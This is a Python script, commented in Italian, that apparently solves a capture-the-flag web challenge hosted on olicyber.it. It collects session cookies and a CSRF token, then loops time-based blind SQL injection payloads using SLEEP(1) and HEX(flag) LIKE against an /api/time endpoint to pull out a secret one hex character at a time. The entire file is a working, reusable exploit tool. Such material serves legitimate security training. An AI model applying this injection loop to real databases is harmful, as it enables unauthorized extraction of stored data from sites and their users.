import requests
import time
from urllib.parse import quote
from bs4 import BeautifulSoup

class Inj:
    def __init__(self, url):
        self.url = url.rstrip("/")
        self.session = requests.Session()
        # Effettuiamo una GET iniziale per ottenere cookie e (eventuale) CSRF token
        r = self.session.get(self.url)
        r.raise_for_status()
        # Estraiamo il CSRF token dal testo; modifica questo parsing in base alla struttura dell'HTML
        try:
            self.csrf = r.text.split("csrf_token =")[1].split("'")[1]
        except IndexError:
            self.csrf = None
        print(f"CSRF token estratto: {self.csrf}")
        cookies_dict = self.session.cookies.get_dict()
        print("Cookies ottenuti:", cookies_dict)

    def time_inj(self, query):
        """
        Invia la payload al target mediante POST (con JSON) e misura il tempo di risposta.
        Se la condizione è vera (ad es. SLEEP(1) viene eseguito),
        il tempo di risposta supererà la soglia impostata.
        """
        inj_url = f"{self.url}/api/time"
        headers = {
            'Content-Type': 'application/json',
            'X-CSRF-Token': self.csrf if self.csrf else "",
        }
        # Impostiamo esplicitamente l'header "Cookie" con i cookie raccolti dalla sessione
        cookie_header = "; ".join(f"{k}={v}" for k, v in self.session.cookies.get_dict().items())
        if cookie_header:
            headers['Cookie'] = cookie_header

        payload = {"query": query}
        try:
            start = time.time()
            r = self.session.post(inj_url, headers=headers, json=payload)
            r.raise_for_status()
            elapsed = time.time() - start
            print("\n=== REQUEST DETAILS ===")
            print(f"URL: {inj_url}")
            print("Headers:")
            for k, v in headers.items():
                print(f"  {k}: {v}")
            print("Payload (JSON):")
            print(payload)
            print("\n=== RESPONSE DETAILS ===")
            print(f"Status Code: {r.status_code}")
            print("Response Text:")
            print(r.text)
            print(f"Elapsed time: {elapsed:.2f} secondi")
            return elapsed, None
        except Exception as e:
            print("\n=== ERRORE DURANTE LA RICHIESTA ===")
            print(str(e))
            return None, str(e)

# --- Codice per l'iniezione time-based SQL ---
inj = Inj('http://web-17.challs.olicyber.it')

dictionary = '0123456789abcdef'
result = ''

print("\n=== AVVIO PROCESSO DI TIME-BASED SQL INJECTION ===")
step = 1
threshold = 1.0  # Soglia in secondi; se il tempo impiegato è >= 1s, la condizione è vera

while True:
    found_char = False
    for c in dictionary:
        # Payload: usa la funzione SLEEP(1) e controlla se HEX(flag) inizia con il risultato parziale + il carattere ipotizzato.
        payload = f"1' AND (SELECT SLEEP(1) FROM flags WHERE HEX(flag) LIKE '{result+c}%')='1"
        print(f"\n--- Step {step} ---")
        print("Risultato corrente:", result)
        print("Testing character:", c)
        elapsed, error = inj.time_inj(payload)
        if elapsed is not None and elapsed >= threshold:
            result += c
            print(f"DEBUG: Carattere '{c}' confermato. Nuovo risultato: {result}")
            found_char = True
            step += 1
            break
    if not found_char:
        print("\nDEBUG: Nessun carattere trovato per questa posizione. Terminazione del processo.")
        break

print("\n=== RISULTATO FINALE ===")
print(f"Flag (in HEX): {result}")

# Conversione del risultato (HEX) in ASCII
try:
    flag_ascii = bytes.fromhex(result).decode("utf-8")
    print(f"Flag (in ASCII): {flag_ascii}")
except Exception as e:
    print("Errore nella conversione da HEX a ASCII:", e)
